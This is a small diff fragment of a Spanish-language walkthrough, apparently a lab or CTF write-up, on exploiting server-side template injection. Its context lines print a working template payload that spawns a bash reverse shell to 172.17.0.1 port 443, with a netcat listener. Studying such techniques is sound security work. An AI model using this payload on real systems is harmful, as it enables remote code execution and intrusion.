@@ -75,9 +75,7 @@ Una de ellas sería ponernos en escucha con netcat, escribiendo en nuestra termi
 
 `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}` 
 
-<br>
 Es importante escapar las comillas simples ya que si no nos dará error.
-
 <br>
 
 Una vez mandada la revshell podemos ver que todo ha ido bien: 
